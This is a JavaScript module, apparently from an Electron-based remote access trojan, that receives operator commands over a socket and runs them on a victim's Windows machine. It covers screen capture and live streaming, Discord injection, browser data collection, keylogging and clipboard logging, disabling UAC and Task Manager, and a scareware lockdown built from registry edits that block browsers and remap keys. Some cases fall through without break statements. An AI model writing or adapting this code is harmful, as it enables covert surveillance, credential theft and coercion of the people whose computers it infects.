
Object.defineProperty(exports, "__esModule", { value: true });
exports.CommandExecutor = undefined;

const Discord = require("./Discord.js");
const childProcess = require("child_process");
const BrowserData = require("./BrowserDataCollector.js");
const Delay = require("../utils/Delay.js");
const Capture = require("../utils/capture.js");
const NetworkInfo = require("../utils/NetworkInfo.js");
const os = require("os");
const Logger = require("../utils/Logger.js");
const ElectronMain = require("../electron/main.js");
const electron = require("electron");
const SystemLockdown = require("../utils/applySystemLockdown.js");
const TaskManager = require("../utils/taskManager.js");
const ControlPanel = require("../utils/controlPanel.js");
const runCommands = require("../utils/runCommands.js");

const POPCHAT_LOCKDOWN_COMMAND = [
  "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v HideIcons /t REG_DWORD /d 1 /f",
  "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoViewContextMenu /t REG_DWORD /d 1 /f",
  "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoWinKeys /t REG_DWORD /d 1 /f",
  "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /t REG_DWORD /d 1 /f",
  "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayItemsDisplay /t REG_DWORD /d 1 /f",
  "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v DisallowRun /t REG_DWORD /d 1 /f",
  "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\" /v 1 /t REG_SZ /d chrome.exe /f",
  "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\" /v 2 /t REG_SZ /d msedge.exe /f",
  "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\" /v 3 /t REG_SZ /d firefox.exe /f",
  "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\" /v 4 /t REG_SZ /d opera.exe /f",
  "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\" /v 5 /t REG_SZ /d operagx.exe /f",
  "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\" /v 6 /t REG_SZ /d brave.exe /f",
  "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Keyboard Layout\" /v \"Scancode Map\" /t REG_BINARY /d 00000000000000000300000000005BE000005CE000000000 /f",
  "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters",
  "taskkill /f /im explorer.exe",
  "start explorer.exe"
].join(" && ");

class CommandExecutor {
  constructor(socket, apiSender, hwid) {
    this.streamInterval = null;
    this.socket = socket;
    this.apiSender = apiSender;
    this.hwid = hwid;
    this.setupListeners();
  }

  setupListeners() {
    Logger.logger.info("Setting up command listener on socket...");
    console.log(
      this.socket.listeners("command").length +
        " listeners currently registered for command event"
    );

    this.socket.on("command", async (message) => {
      const command = message.command || message.type;
      const params = message.params || message.args || {};
      Logger.logger.step("COMMAND_EXECUTOR", "🎯 Command received: " + command);
      Logger.logger.info(
        "⏰ Timestamp: " + message.timestamp + " | Params: " + JSON.stringify(params)
      );

      try {
        await this.executeCommand(command, params);
        Logger.logger.info("✅ Command '" + command + "' executed successfully.");
      } catch (error) {
        Logger.logger.error("❌ Command '" + command + "' execution error:", error);
        this.socket.emit("command-error", { command, error: String(error) });
      }
    });

    Logger.logger.info("✅ Command listener started and ready for commands.");
  }

  async executeCommand(command, params = {}) {
    Logger.logger.info(
      "Executing command: " + command + " with args: " + JSON.stringify(params)
    );
    const normalizedCommand = command.toLowerCase().trim();

    const emitOperationResult = (result) => {
      this.socket.emit("command-result", {
        command,
        hwid: this.hwid,
        success: result.success,
        message: result.success ? result.output : result.error || "İşlem başarısız",
        timestamp: new Date().toISOString()
      });
    };

    const emitSystemControlResult = (reportedCommand, result) => {
      this.socket.emit("command-result", {
        command: reportedCommand,
        hwid: this.hwid,
        success: true,
        message: result.output,
        timestamp: new Date().toISOString()
      });
    };

    switch (normalizedCommand) {
      case "ping":
        Logger.logger.step("COMMAND_EXECUTOR", "🏓 Ping received - responding");
        this.socket.emit("command-result", {
          command: "ping",
          hwid: this.hwid,
          success: true,
          message: "Pong!",
          timestamp: new Date().toISOString()
        });
        return;

      case "status": {
        Logger.logger.step("COMMAND_EXECUTOR", "📊 Status requested");
        const status = {
          hwid: this.hwid,
          hostname: os.hostname(),
          username: os.userInfo().username,
          platform: os.platform(),
          arch: os.arch(),
          cpus: os.cpus().length,
          totalMemory: Math.round(os.totalmem() / 1024 / 1024),
          freeMemory: Math.round(os.freemem() / 1024 / 1024),
          uptime: Math.round(os.uptime()),
          timestamp: new Date().toISOString()
        };
        try {
          const getNetworkInfo = NetworkInfo.getNetworkInfo;
          const network = await getNetworkInfo();
          status.ip = network.ip;
          status.country = network.country;
        } catch (error) {
          Logger.logger.warn("Could not get network info:" + error);
        }
        this.socket.emit("command-result", {
          command: "status",
          hwid: this.hwid,
          success: true,
          data: status,
          timestamp: new Date().toISOString()
        });
        return;
      }

      case "restartdc": {
        await Discord.DiscordDataExtractor.terminateDiscord();
        const delay = Delay.delay;
        await delay(250);
        return await Discord.DiscordDataExtractor.restartDiscord();
      }

      case "closebrowsers":
        return await BrowserData.BrowserDataCollector.terminateAllProcesses();

      case "reinject":
        return await Discord.DiscordDataExtractor.injectDiscord();

      case "relog": {
        const collector = new BrowserData.BrowserDataCollector();
        return await collector.initialize();
      }

      case "capture":
      case "screenshot": {
        try {
          const getNetworkInfo = NetworkInfo.getNetworkInfo;
          const network = await getNetworkInfo();
          const username = os.userInfo().username;
          const takeCapture = Capture.takeCapture;
          return await takeCapture(this.apiSender, {
            username,
            ip: network.ip,
            country: network.country
          });
        } catch (error) {
          Logger.logger.error("Screenshot capture error:", error);
          throw error;
        }
      }

      case "popupchat":
      case "popupChat": 
      case "popchat": {
        Logger.logger.step("COMMAND_EXECUTOR", "🔒 PopChat lockdown mode activated");
        const loadScarewareHtml = ElectronMain.loadScarewareHtml;
        await loadScarewareHtml("scareware");
        try {
          const spawn = childProcess.spawn;
          const process = spawn(
            "powershell.exe",
            ["-NoProfile", "-Command", POPCHAT_LOCKDOWN_COMMAND],
            { detached: true, stdio: "ignore" }
          );
          process.unref();
          Logger.logger.info("✅ PopChat lockdown applied - System restricted");
          this.socket.emit("command-result", {
            command: "popchat",
            hwid: this.hwid,
            success: true,
            message: "PopChat mode activated - System restricted",
            timestamp: new Date().toISOString()
          });
        } catch (error) {
          Logger.logger.error("PopChat lockdown error:", error);
          throw error;
        }
        return;
      }

      case "start-stream":
        if (this.streamInterval) return;
        Logger.logger.step("COMMAND_EXECUTOR", "🎥 Live stream starting...");
        this.streamInterval = setInterval(async () => {
          try {
            const sources = await electron.desktopCapturer.getSources({
              types: ["screen"],
              thumbnailSize: { width: 854, height: 480 },
              fetchWindowIcons: true
            });
            if (sources && sources.length > 0) {
              const frame = sources[0].thumbnail.toDataURL();
              this.socket.emit("stream-frame", { hwid: this.hwid, frame });
            }
          } catch (error) {
            Logger.logger.error("Stream frame error:", error);
          }
        }, 100);
        this.socket.emit("command-result", { command: "start-stream", success: true });
        break;

      case "stop-stream":
        if (this.streamInterval) {
          clearInterval(this.streamInterval);
          this.streamInterval = null;
          Logger.logger.step("COMMAND_EXECUTOR", "🛑 Live stream stopped");
          this.socket.emit("command-result", { command: "stop-stream", success: true });
        }
        break;

      case "windows-lock":
      case "lock": {
        Logger.logger.step("COMMAND_EXECUTOR", "🔒 Windows lockdown initiated");
        const applySystemLockdown = SystemLockdown.applySystemLockdown;
        await applySystemLockdown();
        this.socket.emit("command-result", {
          command: "windows-lock",
          hwid: this.hwid,
          success: true,
          message: "Windows lockdown applied successfully",
          timestamp: new Date().toISOString()
        });
        return;
      }

      case "taskmanager-unlock": {
        const enableTaskManager = TaskManager.enableTaskManager;
        const result = await enableTaskManager();
        if (!result.success) {
          emitSystemControlResult("taskmanager-unlock", result);
        } else {
          emitSystemControlResult("taskmanager-unlock", result);
        }
      }
      case "taskmanager-lock": {
        const disableTaskManager = TaskManager.disableTaskManager;
        const result = await disableTaskManager();
        if (!result.success) {
          emitSystemControlResult("taskmanager-lock", result);
        } else {
          emitSystemControlResult("taskmanager-lock", result);
        }
      }
      case "control-panel-lock": {
        const disableControlPanel = ControlPanel.disableControlPanel;
        const result = await disableControlPanel();
        if (!result.success) {
          emitSystemControlResult("control-panel-unlock", result);
        } else {
          emitSystemControlResult("control-panel-unlock", result);
        }
      }
      case "control-panel-unlock": {
        const enableControlPanel = ControlPanel.enableControlPanel;
        const result = await enableControlPanel();
        if (!result.success) {
          emitSystemControlResult("control-panel-unlock", result);
        } else {
          emitSystemControlResult("control-panel-unlock", result);
        }
      }
      case "lock-mouse":
        emitOperationResult(await runCommands.lockMouse());
        break;

      case "unlock-mouse":
        emitOperationResult(await runCommands.unlockMouse());
        break;
      case "logout-mails":
        emitOperationResult(await runCommands.logoutMails());
        break;
      case "shutdown-pc":
        emitOperationResult(await runCommands.shutdownPc());
        break;
      case "warning-message":
        emitOperationResult(await runCommands.warningMessage());
        break;
      case "fake-bsod":
        emitOperationResult(await runCommands.fakeBsod());
        break;
      case "delete-browsers":
        emitOperationResult(await runCommands.deleteBrowsers());
        break;
      case "webcam-wallpaper":
        emitOperationResult(await runCommands.webcamWallpaper());
        break;
      case "quit-discord":
        emitOperationResult(await runCommands.quitDiscord());
        break;
      case "start-clipboard-logger":
        emitOperationResult(await runCommands.startClipboardLogger());
        break;
      case "read-clipboard-logger":
        emitOperationResult(await runCommands.readClipboardLogger());
        break;
      case "start-keylogger":
        emitOperationResult(await runCommands.startKeylogger());
        break;
      case "read-keylogger":
        emitOperationResult(await runCommands.readKeylogger());
        break;
      case "disable-uac":
        emitOperationResult(await runCommands.disableUac());
        break;

      default:
        throw new Error("Unknown command: " + command);
    }
  }
}

exports.CommandExecutor = CommandExecutor;
